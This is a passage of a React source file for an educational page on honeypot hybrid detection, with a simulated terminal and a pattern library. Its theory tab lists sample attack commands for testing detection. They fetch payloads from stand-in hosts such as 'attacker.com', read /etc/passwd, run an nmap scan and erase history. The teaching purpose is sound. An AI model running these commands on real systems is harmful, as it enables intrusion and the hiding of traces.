  const clearAll = () => {
    setDetectionResults([]);
    setDetectionLog([]);
  };

  // Fetch unified hybrid patterns
  useEffect(() => {
    if (!showPatternLibrary) return; // lazy load when opened
    let cancelled = false;
    (async () => {
      try {
        setPatternLoading(true);
        setPatternError(null);
        const res = await fetch('/api/hybrid/patterns');
        if (res.ok) {
          const data = await res.json();
          if (!cancelled) setHybridPatterns(Array.isArray(data.patterns) ? data.patterns : []);
        } else if (res.status === 404) {
          // Backend may not yet have unified endpoint; fallback to separate sources
          const [sigRes, anoRes] = await Promise.all([
            fetch('/api/signatures').catch(()=>null),
            fetch('/api/anomaly/patterns').catch(()=>null)
          ]);
          const sigs = sigRes && sigRes.ok ? await sigRes.json() : [];
          const anos = anoRes && anoRes.ok ? await anoRes.json() : {patterns: []};
          // Signatures may come as list directly or object
          const sigList = Array.isArray(sigs) ? sigs : Array.isArray(sigs.signatures) ? sigs.signatures : [];
          const anoList = Array.isArray(anos.patterns) ? anos.patterns : [];
          const merged = [
            ...sigList.map(s => ({
              source: 'signature',
              id: s.id || s.pattern,
              name: s.pattern,
              pattern: s.pattern,
              regex: !!s.regex,
              type: s.type || 'generic',
              severity: s.severity || 'Medium',
              active: true,
              description: s.description
            })),
            ...anoList.map(p => ({
              source: 'anomaly',
              id: p.id || p.name,
              name: p.name,
              pattern: p.regex || p.pattern || p.pattern_regex,
              regex: true,
              type: p.type,
              boost: typeof p.boost === 'number' ? p.boost : (typeof p.boost_value === 'number' ? p.boost_value : (p.boost ? Number(p.boost) : 0)),
              severity: p.severity || 'Medium',
              active: p.active !== undefined ? p.active : true,
              description: p.description
            }))
          ];
          if (!cancelled) setHybridPatterns(merged);
        } else {
          throw new Error(`HTTP ${res.status}`);
        }
      } catch (e) {
        if (!cancelled) setPatternError(e.message);
      } finally {
        if (!cancelled) setPatternLoading(false);
      }
    })();
    return () => { cancelled = true; };
  }, [showPatternLibrary]);

  const liveSlice = detectionResults.slice(-MAX_LIVE);

  const severityBadge = (sev) => {
    switch (sev) {
      case 'High': return 'bg-red-100 text-red-700';
      case 'Medium': return 'bg-yellow-100 text-yellow-700';
      default: return 'bg-blue-100 text-blue-700';
    }
  };

  // Register chart.js components once
  if (!ChartJS.registry.getPlugin('legend')) {
    ChartJS.register(LineElement, PointElement, LinearScale, CategoryScale, Tooltip, Legend);
  }

  // Prepare chart data
  let chartData;
  if (hybridSeries.length > 0) {
    // For component series, attempt to align by time label using detectionLog's componentScores if available
    const signaturePoints = [];
    const anomalyPoints = [];
    const hybridPoints = [];
    hybridSeries.forEach(entry => {
      // Find a matching detection with componentScores for this timestamp
      const det = detectionLog.find(d => d.timestamp === entry.t && d.componentScores);
      if (det && det.componentScores) {
        signaturePoints.push((det.componentScores.signature * 100).toFixed(2));
        anomalyPoints.push((det.componentScores.anomaly * 100).toFixed(2));
        hybridPoints.push((det.componentScores.hybrid * 100).toFixed(2));
      } else {
        // fallback using stored hybrid, zero for others if missing
        hybridPoints.push((entry.hybrid * 100).toFixed(2));
        signaturePoints.push('0.00');
        anomalyPoints.push('0.00');
      }
    });
    chartData = {
      labels: hybridSeries.map(p => p.t),
      datasets: [
        {
          label: 'Hybrid Confidence',
          data: hybridPoints,
            borderColor: 'rgba(79,70,229,0.9)',
          backgroundColor: 'rgba(79,70,229,0.15)',
          tension: 0.25,
          fill: true,
          pointRadius: 2
        },
        {
          label: 'Signature Component',
          data: signaturePoints,
          borderColor: 'rgba(37,99,235,0.85)',
          backgroundColor: 'rgba(37,99,235,0.10)',
          tension: 0.25,
          fill: false,
          pointRadius: 2
        },
        {
          label: 'Anomaly Component',
          data: anomalyPoints,
          borderColor: 'rgba(220,38,38,0.85)',
          backgroundColor: 'rgba(220,38,38,0.10)',
          tension: 0.25,
          fill: false,
          pointRadius: 2
        }
      ]
    };
  }

  // Session stats
  const sessionCommands = commandHistory.length;
  const uniqueCommands = new Set(commandHistory.map(c => c.command.split(' ')[0])).size;
  const hybridCount = detectionLog.length;
  const lastDetection = selectedDetection || detectionResults[detectionResults.length - 1];

  // Export detections as JSON for analysis
  const exportDetections = () => {
    try {
      const payload = {
        exported_at: new Date().toISOString(),
        count: detectionLog.length,
        detections: detectionLog
      };
      const blob = new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = 'hybrid_detections_export.json';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
    } catch (e) {
      console.error('Failed to export detections', e);
    }
  };

  return (
    <div ref={containerRef} className="bg-[#FFFFFF] p-4"> {/* Removed min-h-screen */}
      <div className="max-w-6xl mx-auto bg-white rounded-lg p-4">
        <div className="bg-white rounded-lg">
          <div className="flex justify-between items-center mb-8">
            <h1 className="text-4xl font-bold bg-gradient-to-r from-[#1E5780] to-blue-600 bg-clip-text text-transparent">Hybrid Detection</h1>
            <div className="flex space-x-4">
              <button
              onClick={() => handleTabChange('theory')}
              className={`px-6 py-3 rounded-xl font-semibold transition-all duration-200 ${
                activeTab === 'theory'
                  ? 'bg-gradient-to-r from-[#1E5780] to-blue-600 text-white shadow-lg transform scale-105'
                  : 'bg-white text-gray-700 hover:bg-gray-50 border-2 border-gray-200 hover:border-[#1E5780]'
              }`}
              >
                Theory
              </button>
              <button
              onClick={() => handleTabChange('simulation')}
              className={`px-6 py-3 rounded-xl font-semibold transition-all duration-200 ${
                activeTab === 'simulation'
                  ? 'bg-gradient-to-r from-[#1E5780] to-blue-600 text-white shadow-lg transform scale-105'
                  : 'bg-white text-gray-700 hover:bg-gray-50 border-2 border-gray-200 hover:border-[#1E5780]'
              }`}
              >
                Simulation
              </button>
            </div>
          </div>

          {activeTab === 'theory' ? (
            <div className="space-y-6">
              <section>
                <h2 className="text-2xl font-semibold text-gray-800 mb-4">What is Hybrid Detection in Cowrie?</h2>
                <p className="text-gray-600 mb-4">
                  Cowrie's hybrid detection combines signature-based and anomaly-based approaches to provide comprehensive threat detection. 
                  It uses the Aho-Corasick algorithm for efficient pattern matching and Isolation Forest for identifying unusual behavior, 
                  offering both high accuracy for known attacks and discovery of novel threats.
                </p>
              </section>

              <section>
                <h2 className="text-2xl font-semibold text-gray-800 mb-4">How Cowrie Hybrid Detection Works</h2>
                <div className="bg-gray-50 p-6 rounded-lg">
                  <ol className="list-decimal list-inside space-y-3 text-gray-600">
                    <li>Analyzes commands with both signature and anomaly detection</li>
                    <li>Correlates results from multiple detection methods</li>
                    <li>Applies weighted scoring for comprehensive threat assessment</li>
                    <li>Adapts detection weights based on confidence levels</li>
                  </ol>
                </div>
              </section>

              <section>
                <h2 className="text-2xl font-semibold text-gray-800 mb-4">Advantages</h2>
                <ul className="list-disc list-inside space-y-2 text-gray-600">
                  <li>Combines accuracy of signatures with discovery of anomalies</li>
                  <li>Reduces false positives through correlation</li>
                  <li>Detects both known and unknown attack patterns</li>
                  <li>Provides adaptive threat detection capabilities</li>
                </ul>
              </section>

              <section>
                <h2 className="text-2xl font-semibold text-gray-800 mb-4">Limitations</h2>
                <ul className="list-disc list-inside space-y-2 text-gray-600">
                  <li>Higher computational overhead than single methods</li>
                  <li>Requires careful tuning of correlation parameters</li>
                  <li>Complex configuration and maintenance</li>
                  <li>May require more storage for detection logs</li>
                </ul>
              </section>

              <section>
                <h2 className="text-2xl font-semibold text-gray-800 mb-4">Detection Methods Combined</h2>
                <div className="bg-gray-50 p-6 rounded-lg">
                  <div className="space-y-4">
                    <div>
                      <h3 className="font-semibold text-gray-800">Signature Detection (Aho-Corasick)</h3>
                      <p className="text-gray-600">Fast pattern matching for known attack signatures and malicious commands</p>
                    </div>
                    <div>
                      <h3 className="font-semibold text-gray-800">Anomaly Detection (Isolation Forest)</h3>
                      <p className="text-gray-600">Machine learning approach to identify unusual behavior patterns</p>
                    </div>
                    <div>
                      <h3 className="font-semibold text-gray-800">Correlation Engine</h3>
                      <p className="text-gray-600">Intelligent correlation of detection results with adaptive weighting</p>
                    </div>
                  </div>
                </div>
              </section>

              {/* Add new section for Parameters and Algorithms */}
              <div className="bg-white p-6 rounded-lg shadow-md">
                <h2 className="text-xl font-semibold mb-4">Detection Parameters and Algorithms</h2>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div>
                    <h3 className="text-lg font-semibold mb-2">Signature Detection</h3>
                    <ul className="list-disc pl-5 space-y-2 text-gray-700">
                      <li>Sensitivity: {parameters.signatureBased.sensitivity}</li>
                      <li>Fuzzy Matching: {parameters.signatureBased.fuzzyMatching ? 'Enabled' : 'Disabled'}</li>
                      <li>Time Window: {parameters.signatureBased.timeWindow.default}s</li>
                      <li>Threshold: {parameters.signatureBased.thresholds.default}</li>
                    </ul>
                  </div>
                  <div>
                    <h3 className="text-lg font-semibold mb-2">Anomaly Detection</h3>
                    <ul className="list-disc pl-5 space-y-2 text-gray-700">
                      <li>Model: {parameters.anomalyBased.machineLearning.modelType}</li>
                      <li>Contamination: {parameters.anomalyBased.machineLearning.contamination}</li>
                      <li>Estimators: {parameters.anomalyBased.machineLearning.nEstimators}</li>
                      <li>Sensitivity: {parameters.anomalyBased.statistical.sensitivity}</li>
                    </ul>
                  </div>
                </div>
              </div>

              {/* Add new section for Hybrid Algorithm Details */}
              <div className="bg-white p-6 rounded-lg shadow-md">
                <h2 className="text-xl font-semibold mb-4">Hybrid Algorithm Implementation</h2>
                <p className="text-gray-600 mb-4">
                  The hybrid approach combines Aho-Corasick for signature matching with Isolation Forest for anomaly detection, 
                  using intelligent correlation to provide comprehensive threat analysis.
                </p>
                <div className="space-y-4">
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div>
                      <h3 className="text-lg font-semibold mb-2">Aho-Corasick Algorithm</h3>
                      <div className="space-y-2">
                        <div className="pl-4 border-l-2 border-gray-200">
                          <h4 className="font-medium">Trie Construction</h4>
                          <p className="text-sm text-gray-600">Build trie of all attack patterns</p>
                        </div>
                        <div className="pl-4 border-l-2 border-gray-200">
                          <h4 className="font-medium">Failure Function</h4>
                          <p className="text-sm text-gray-600">Compute failure links using BFS traversal</p>
                        </div>
                        <div className="pl-4 border-l-2 border-gray-200">
                          <h4 className="font-medium">Pattern Matching</h4>
                          <p className="text-sm text-gray-600">Linear scan with failure link following</p>
                        </div>
                      </div>
                    </div>
                    
                    <div>
                      <h3 className="text-lg font-semibold mb-2">Isolation Forest</h3>
                      <div className="space-y-2">
                        <div className="pl-4 border-l-2 border-gray-200">
                          <h4 className="font-medium">Feature Extraction</h4>
                          <p className="text-sm text-gray-600">14-dimensional vectors from commands</p>
                        </div>
                        <div className="pl-4 border-l-2 border-gray-200">
                          <h4 className="font-medium">Random Partitioning</h4>
                          <p className="text-sm text-gray-600">Build isolation trees with random splits</p>
                        </div>
                        <div className="pl-4 border-l-2 border-gray-200">
                          <h4 className="font-medium">Anomaly Scoring</h4>
                          <p className="text-sm text-gray-600">Shorter paths indicate anomalies</p>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              {/* Confidence & Correlation (wrapped) */}
              <div className="bg-white p-6 rounded-lg border border-gray-300">
                <div className="space-y-6">
                  <div>
                    <h3 className="font-semibold text-gray-800">Confidence Weighting</h3>
                    <p className="text-gray-700">Signature confidence (60%) + Anomaly confidence (40%) = Hybrid score</p>
                  </div>
                  <div className="flex items-start space-x-4">
                    <div className="w-8 h-8 rounded-full bg-[#1E5780] text-white flex items-center justify-center">3</div>
                    <div>
                      <h3 className="font-semibold text-gray-800">Correlation Analysis</h3>
                      <p className="text-gray-700">Strong correlation when both methods detect threats, medium for single-method detections</p>
                    </div>
                  </div>
                </div>
              </div>

              <div className="bg-white p-6 rounded-lg border border-gray-300">
                <h2 className="text-xl font-semibold mb-4">Educational Score Boosting</h2>
                <p className="text-gray-700 mb-4">
                  For educational purposes, the system applies pedagogical enhancements to make anomaly scores more visible while maintaining algorithmic accuracy:
                </p>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="bg-blue-50 p-4 rounded">
                    <h4 className="font-semibold">Hybrid Pattern-Based Boosting</h4>
                    <ul className="text-sm text-gray-700 mt-2">
                      <li>• Suspicious commands: +20%</li>
                      <li>• Network activity: +15%</li>
                      <li>• Sensitive file access: +25%</li>
                      <li>• Script execution: +12%</li>
                      <li>• URL/domain patterns: +10%</li>
                      <li>• Maximum cap: 90% (allows hybrid weighting)</li>
                    </ul>
                  </div>
                  <div className="bg-green-50 p-4 rounded">
                    <h4 className="font-semibold">Balanced Scoring</h4>
                    <ul className="text-sm text-gray-700 mt-2">
                      <li>• Conservative boosting for hybrid context</li>
                      <li>• Prevents score inflation</li>
                      <li>• Allows meaningful correlation analysis</li>
                      <li>• Maintains algorithm integrity</li>
                    </ul>
                  </div>
                </div>
              </div>

              <div className="bg-white p-6 rounded-lg border border-gray-300">
                <h2 className="text-xl font-semibold mb-4">Testing Commands for Hybrid Detection</h2>
                <p className="text-gray-700 mb-4">
                  Try these commands in the terminal to see both Aho-Corasick signature matching and Isolation Forest anomaly detection in action:
                </p>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div>
                    <h3 className="text-lg font-semibold mb-2">Signature Detection (Aho-Corasick)</h3>
                    <div className="bg-gray-50 p-3 rounded text-sm font-mono">
                      <p>cat /etc/passwd</p>
                      <p>wget http://malicious.com/script.sh</p>
                      <p>ssh user@target -L 8080:localhost:80</p>
                      <p>nmap -sS 192.168.1.0/24</p>
                    </div>
                  </div>
                  <div>
                    <h3 className="text-lg font-semibold mb-2">Anomaly Detection (Isolation Forest)</h3>
                    <div className="bg-gray-50 p-3 rounded text-sm font-mono">
                      <p>chmod +x suspicious_script && ./suspicious_script</p>
                      <p>curl -O http://attacker.com/payload.py</p>
                      <p>rm -rf /tmp/* && history -c</p>
                      <p>python -c "import socket; exec(...)"</p>
                    </div>
                  </div>
                </div>
                <div className="mt-4 p-4 bg-blue-50 rounded">
                  <h4 className="font-semibold text-blue-800">Hybrid Correlation Examples</h4>
                  <p className="text-blue-700 text-sm mt-2">
                    Commands that trigger both detection methods will show "Strong" correlation, 
                    while single-method detections show "Medium" correlation. The system uses weighted scoring 
                    (60% signature + 40% anomaly) for final threat assessment.
                  </p>
                </div>
              </div>

              <div className="bg-white p-6 rounded-lg border border-gray-300">
                <h2 className="text-xl font-semibold mb-4">Advantages of Hybrid Detection</h2>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div>
                    <h3 className="text-lg font-semibold mb-2">Comprehensive Coverage</h3>
                    <p className="text-gray-700">
                      By combining both detection methods, hybrid systems can identify both known and unknown threats.
                    </p>
                  </div>
                  <div>
                    <h3 className="text-lg font-semibold mb-2">Reduced False Positives</h3>
                    <p className="text-gray-700">
                      Correlation between signature and anomaly detection helps reduce false alarms.
                    </p>
                  </div>
                  <div>
                    <h3 className="text-lg font-semibold mb-2">Adaptive Security</h3>
                    <p className="text-gray-700">
                      The system can adapt to new threats while maintaining protection against known ones.
                    </p>
                  </div>
                  <div>
                    <h3 className="text-lg font-semibold mb-2">Better Context</h3>
                    <p className="text-gray-700">
                      Provides more context about detected threats by combining multiple detection methods.
                    </p>
                  </div>
                </div>
              </div>

              {/* Add new section for Parameters and Algorithms */}
              <div className="bg-white p-6 rounded-lg border border-gray-300">
                <h2 className="text-xl font-semibold mb-4">Hybrid Detection Parameters</h2>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                  <div>
                    <h3 className="text-lg font-semibold mb-2">Signature-Based</h3>
                    <ul className="list-disc pl-5 space-y-2 text-gray-700">
                      <li>Sensitivity: {algorithmParameters.signatureBased.sensitivity}</li>
                      <li>Fuzzy Matching: {algorithmParameters.signatureBased.fuzzyMatching ? 'Enabled' : 'Disabled'}</li>
                      <li>Time Window: {algorithmParameters.signatureBased.timeWindow.default}s</li>
                      <li>Threshold: {algorithmParameters.signatureBased.thresholds.default}</li>
                    </ul>
                  </div>
                  <div>
                    <h3 className="text-lg font-semibold mb-2">Anomaly-Based</h3>
                    <ul className="list-disc pl-5 space-y-2 text-gray-700">
                      <li>Sensitivity: {algorithmParameters.anomalyBased.statistical.sensitivity}</li>
                      <li>Window Size: {algorithmParameters.anomalyBased.statistical.windowSize}</li>
                      <li>Update Interval: {algorithmParameters.anomalyBased.statistical.updateInterval}s</li>
                      <li>Model: {algorithmParameters.anomalyBased.machineLearning.modelType}</li>
                    </ul>
                  </div>
                  <div>
                    <h3 className="text-lg font-semibold mb-2">Hybrid</h3>
                    <ul className="list-disc pl-5 space-y-2 text-gray-700">
                      <li>Signature Weight: {algorithmParameters.hybrid.weightSignature}</li>
                      <li>Anomaly Weight: {algorithmParameters.hybrid.weightAnomaly}</li>
                      <li>Confidence Threshold: {algorithmParameters.hybrid.confidenceThreshold}</li>
                      <li>Correlation Window: {algorithmParameters.hybrid.correlationWindow}s</li>
                    </ul>
                  </div>
                </div>
              </div>

              {/* Add new section for Signature Database */}
              <div className="bg-white p-6 rounded-lg border border-gray-300">
                <h2 className="text-xl font-semibold mb-4">Signature Database</h2>
                <div className="space-y-4">
                  {Object.entries(signatureDatabase).map(([category, data]) => (
                    <div key={category} className="border rounded-lg p-4">
                      <h3 className="text-lg font-semibold mb-2">{data.name}</h3>
                      <div className="space-y-2">
                        {data.patterns.map(pattern => (
                          <div key={pattern.id} className="pl-4 border-l-2 border-gray-200">
                            <h4 className="font-medium">{pattern.name}</h4>
                            <p className="text-sm text-gray-600">{pattern.description}</p>
                            <p className="text-xs text-gray-500">
                              Threshold: {pattern.threshold} | Time Window: {pattern.timeWindow}s
                            </p>
                          </div>
                        ))}
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              {/* Add new section for Anomaly Dataset */}
              <div className="bg-white p-6 rounded-lg border border-gray-300">
                <h2 className="text-xl font-semibold mb-4">Anomaly Detection Dataset</h2>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div>
                    <h3 className="text-lg font-semibold mb-2">Normal Behavior</h3>
                    <div className="space-y-4">
                      <div>
                        <h4 className="font-medium">Command Frequency</h4>
                        <ul className="list-disc pl-5">
                          {Object.entries(anomalyDataset.normal.commandFrequency)
                            .map(([cmd, freq]) => (
                              <li key={cmd}>{cmd}: {(freq * 100).toFixed(1)}%</li>
                            ))}
                        </ul>
                      </div>
                      <div>
                        <h4 className="font-medium">Time Patterns</h4>
                        <p>Working Hours: {anomalyDataset.normal.timePatterns.workingHours[0]}:00 - {anomalyDataset.normal.timePatterns.workingHours[1]}:00</p>
                        <p>Average Session: {anomalyDataset.normal.timePatterns.sessionLength / 60} minutes</p>
                      </div>
                    </div>
                  </div>
                  <div>
                    <h3 className="text-lg font-semibold mb-2">Anomalous Behavior</h3>
                    <div className="space-y-4">
                      <div>
                        <h4 className="font-medium">Suspicious Commands</h4>
                        <ul className="list-disc pl-5">
                          {Object.entries(anomalyDataset.anomalous.commandFrequency)
                            .map(([cmd, freq]) => (
                              <li key={cmd}>{cmd}: {(freq * 100).toFixed(1)}%</li>
                            ))}
                        </ul>
                      </div>
                      <div>
                        <h4 className="font-medium">Anomalous Patterns</h4>
                        <p>Unusual Hours: {anomalyDataset.anomalous.timePatterns.workingHours[0]}:00 - {anomalyDataset.anomalous.timePatterns.workingHours[1]}:00</p>
                        <p>Short Sessions: {anomalyDataset.anomalous.timePatterns.sessionLength / 60} minutes</p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          ) : (
            <div className="space-y-6">
              <div className="grid grid-cols-1 xl:grid-cols-3 gap-6">
                {/* Left: Terminal + Analytics */}
                <div className="xl:col-span-2 space-y-6">
                  <div className="bg-white border border-gray-200 rounded-lg p-4 shadow-sm">
                    <div className="flex items-center justify-between mb-2">
                      <h3 className="font-semibold text-gray-800 text-sm tracking-wide uppercase">Interactive Terminal</h3>
                      <div className="flex items-center gap-2">
                        <button onClick={() => setPaused(p=>!p)} className={`px-3 py-1 rounded text-xs font-semibold ${paused ? 'bg-yellow-500 text-white' : 'bg-gray-100 hover:bg-gray-200 text-gray-700'}`}>{paused ? 'Resume' : 'Pause'}</button>
                        <button onClick={clearAll} className="px-3 py-1 rounded text-xs font-semibold bg-red-500 text-white hover:bg-red-600">Clear</button>
                        <button onClick={() => setShowPatternLibrary(s=>!s)} className="px-3 py-1 rounded text-xs font-semibold bg-indigo-600 text-white hover:bg-indigo-700">{showPatternLibrary ? 'Hide Patterns' : 'Patterns'}</button>
                      </div>
                    </div>
                    <RealTerminal onCommand={handleTerminalCommand} simulationType="hybrid" />
                  </div>

                  {showPatternLibrary && (
                    <div className="bg-white border border-indigo-200 rounded-lg p-4 shadow-sm">
                      <div className="flex items-center justify-between mb-3">
                        <h4 className="font-semibold text-indigo-800 text-sm tracking-wide uppercase">Hybrid Pattern Library</h4>
                        <div className="flex items-center gap-2">
                          <span className="text-[10px] text-indigo-500 bg-indigo-50 px-2 py-0.5 rounded" title="Total patterns loaded">{hybridPatterns.length}</span>
                        </div>
                      </div>
                      <div className="flex items-center gap-2 mb-3">
                        <input value={patternFilter} onChange={e=>setPatternFilter(e.target.value)} placeholder="Filter (name, type, source, severity)" className="flex-1 border border-gray-300 rounded px-2 py-1 text-xs focus:ring-2 focus:ring-indigo-500" />
                        {patternFilter && <button onClick={()=>setPatternFilter('')} className="text-[10px] text-gray-500 hover:text-gray-700">Clear</button>}
                      </div>
                      {patternLoading && <div className="text-xs text-gray-500 italic py-4">Loading patterns...</div>}
                      {patternError && <div className="text-xs text-red-600 bg-red-50 border border-red-100 rounded p-2">Failed to load patterns: {patternError}</div>}
                      {!patternLoading && !patternError && (
                        <div className="max-h-56 overflow-y-auto divide-y divide-gray-50">
                          {hybridPatterns
                            .filter(p => {
                              if (!patternFilter) return true;
                              const t = patternFilter.toLowerCase();
                              return (
                                (p.name && p.name.toLowerCase().includes(t)) ||
                                (p.type && p.type.toLowerCase().includes(t)) ||
                                (p.source && p.source.toLowerCase().includes(t)) ||
                                (p.severity && p.severity.toLowerCase().includes(t))
                              );
                            })
                            .map(p => (
                              <div key={p.source + '-' + p.id + '-' + p.name} className="py-2 text-[11px]">
                                <div className="flex items-center gap-2 mb-0.5">
                                  <span className={`px-1.5 py-0.5 rounded font-semibold text-[9px] ${p.severity==='High' ? 'bg-red-100 text-red-700' : p.severity==='Medium' ? 'bg-yellow-100 text-yellow-700' : 'bg-blue-100 text-blue-700'}`}>{p.severity}</span>
                                  <span className="font-medium text-gray-800 truncate" title={p.name}>{p.name}</span>
                                  {p.boost !== undefined && <span className="ml-auto text-[9px] bg-indigo-50 text-indigo-700 px-1.5 py-0.5 rounded" title="Anomaly Boost">{p.boost !== null ? '+'+Number(p.boost).toFixed(2) : ''}</span>}
                                  <span className={`text-[9px] px-1.5 py-0.5 rounded uppercase tracking-wide ${p.source==='signature' ? 'bg-blue-50 text-blue-700' : 'bg-fuchsia-50 text-fuchsia-700'}`}>{p.source}</span>
                                  {!p.active && <span className="text-[9px] bg-gray-200 text-gray-600 px-1.5 py-0.5 rounded" title="Inactive">OFF</span>}
                                </div>
                                {p.pattern && <div className="text-gray-500 truncate" title={p.pattern}><span className="text-gray-400">/</span>{p.pattern}<span className="text-gray-400">/</span></div>}
                                <div className="flex items-center gap-2 mt-0.5">
                                  <span className="text-[9px] uppercase tracking-wide text-indigo-600 bg-indigo-50 px-1 py-0.5 rounded">{p.type}</span>
                                  {p.description && <span className="text-[9px] text-gray-500 truncate" title={p.description}>{p.description}</span>}
                                </div>
                              </div>
                            ))}
                          {hybridPatterns.length === 0 && (
                            <div className="text-xs text-gray-400 italic py-4 text-center">No patterns</div>
                          )}
                        </div>
                      )}
                    </div>
                  )}

                  {showAnalytics && (
                    <div className="bg-white border border-gray-200 rounded-lg p-4 shadow-sm">
                      <div className="flex items-center justify-between mb-4">
                        <h4 className="font-semibold text-gray-800 text-sm tracking-wide uppercase">Detection Analytics</h4>
                        <button onClick={() => setShowAnalytics(false)} className="text-xs text-gray-400 hover:text-gray-600">Hide</button>
                      </div>
                      <div className="flex flex-col md:flex-row md:items-center md:space-x-4 space-y-3 md:space-y-0 mb-4">
                        <input
                          type="text"
                          value={filterText}
                          onChange={e=>setFilterText(e.target.value)}
                          placeholder="Filter detections (command, type, description)..."
                          className="flex-1 border border-gray-300 rounded-lg px-3 py-2 text-sm focus:ring-2 focus:ring-indigo-500 focus:border-transparent"
                        />
                        <div className="text-xs text-gray-500">Showing {filteredLog.length} / {detectionLog.length}</div>
                      </div>
                      <div className="grid grid-cols-2 md:grid-cols-4 gap-2 mb-4">
                        <div className="p-2 rounded bg-indigo-50 text-indigo-700 text-center text-xs font-semibold">Cmd: {sessionCommands}</div>
                        <div className="p-2 rounded bg-blue-50 text-blue-700 text-center text-xs font-semibold">Unique: {uniqueCommands}</div>
                        <div className="p-2 rounded bg-purple-50 text-purple-700 text-center text-xs font-semibold">Detections: {hybridCount}</div>
                        <div className="p-2 rounded bg-green-50 text-green-700 text-center text-xs font-semibold">Paused: {paused ? 'Yes' : 'No'}</div>
                      </div>
                      {filteredLog.length === 0 ? (
                        <div className="text-center py-6 text-sm text-gray-500 italic">No detections recorded</div>
                      ) : (
                        <div className="max-h-72 overflow-y-auto divide-y divide-gray-50">
                          {filteredLog.slice().reverse().map((item, idx) => (
                            <div key={idx} className={`py-2 text-sm cursor-pointer ${selectedDetection && selectedDetection._id===item._id ? 'bg-indigo-50/70 rounded' : ''}`} onClick={() => setSelectedDetection(item)}>
                              <div className="flex items-center justify-between">
                                <div className="flex items-center gap-2">
                                  <span className={`px-2 py-0.5 rounded-full text-[10px] font-semibold ${severityBadge(item.severity)}`}>{item.severity}</span>
                                  <span className="font-medium text-gray-800 truncate max-w-[200px]" title={item.description}>{item.type}</span>
                                </div>
                                <span className="text-[10px] text-gray-400 bg-gray-50 px-2 py-0.5 rounded">{item.timestamp}</span>
                              </div>
                              <div className="mt-1 grid grid-cols-1 sm:grid-cols-2 gap-2 text-[11px] font-mono">
                                <div className="truncate"><span className="text-gray-500">cmd:</span> <code className="bg-yellow-100 px-1 rounded" title={item.command}>{item.command}</code></div>
                                <div className="truncate"><span className="text-gray-500">desc:</span> <code className="bg-gray-100 px-1 rounded" title={item.description}>{item.description}</code></div>
                              </div>
                              {item.confidence !== undefined && (
                                <div className="mt-1 text-[10px] text-gray-500 flex gap-2">
                                  <span>conf {(item.confidence*100).toFixed(1)}%</span>
                                  {item.details?.correlationStrength && <span>corr {item.details.correlationStrength}</span>}
                                </div>
                              )}
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                  )}

                  {hybridSeries.length > 0 && (
                    <div className="bg-white border border-gray-200 rounded-lg p-4 shadow-sm">
                      <div className="flex items-center justify-between mb-3">
                        <h4 className="font-semibold text-gray-800 text-sm tracking-wide uppercase">Hybrid Confidence Trend & Inspector</h4>
                        <div className="flex items-center gap-2">
                          {lastDetection && <span className={`px-2 py-0.5 rounded-full text-[10px] font-semibold ${severityBadge(lastDetection.severity)}`}>{lastDetection.severity}</span>}
                          <button onClick={exportDetections} className="px-2 py-0.5 rounded bg-gray-100 hover:bg-gray-200 text-[10px] font-semibold text-gray-700">Export</button>
                        </div>
                      </div>
                      {chartData && (
                        <div className="w-full h-48 mb-4">
                          <Line
                            data={chartData}
                            options={{
                              responsive: true,
                              maintainAspectRatio: false,
                              interaction: { mode: 'index', intersect: false },
                              plugins: { legend: { display: true, position: 'bottom' } },
                              scales: { y: { ticks: { callback: v => v + '%' }, beginAtZero: true, max: 100 } }
                            }}
                          />
                        </div>
                      )}
                      {lastDetection ? (
                        <div className="space-y-3 text-[11px]">
                          <div className="flex flex-wrap gap-2 items-center">
                            <span className="px-2 py-0.5 bg-indigo-100 text-indigo-700 rounded">{lastDetection.type}</span>
                            {lastDetection.details?.correlationStrength && (
                              <span className="px-2 py-0.5 bg-purple-100 text-purple-700 rounded">Correlation: {lastDetection.details.correlationStrength}</span>
                            )}
                            {lastDetection.details?.modelVersion && (
                              <span className="px-2 py-0.5 bg-gray-100 text-gray-700 rounded">Model v{lastDetection.details.modelVersion}</span>
                            )}
                          </div>
                          <div className="text-gray-700 font-medium">{lastDetection.description}</div>
                          <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-2">
                            <div className="p-2 bg-gray-50 rounded">Hybrid: {(lastDetection.confidence*100).toFixed(2)}%</div>
                            {lastDetection.componentScores?.signature !== undefined && <div className="p-2 bg-gray-50 rounded">Signature: {(lastDetection.componentScores.signature*100).toFixed(2)}%</div>}
                            {lastDetection.details?.anomalyBaseScore !== undefined && <div className="p-2 bg-gray-50 rounded">Anom Base: {(lastDetection.details.anomalyBaseScore*100).toFixed(2)}%</div>}
                            {lastDetection.details?.anomalyBoostedScore !== undefined && <div className="p-2 bg-gray-50 rounded">Anom Boosted: {(lastDetection.details.anomalyBoostedScore*100).toFixed(2)}%</div>}
                            {lastDetection.details?.boostDelta !== undefined && <div className="p-2 bg-gray-50 rounded">Boost Δ: {(lastDetection.details.boostDelta*100).toFixed(2)}%</div>}
                            {lastDetection.details?.threshold !== undefined && <div className="p-2 bg-gray-50 rounded">Threshold: {(lastDetection.details.threshold*100).toFixed(1)}%</div>}
                          </div>
                          {lastDetection.details?.matchedPatterns && lastDetection.details.matchedPatterns.length > 0 && (
                            <div>
                              <h5 className="font-semibold text-gray-600 text-[10px] mb-1">Semantic Matched Patterns ({lastDetection.details.matchedPatterns.length})</h5>
                              <div className="flex flex-wrap gap-1">
                                {lastDetection.details.matchedPatterns.slice(0,12).map((p,i)=>(
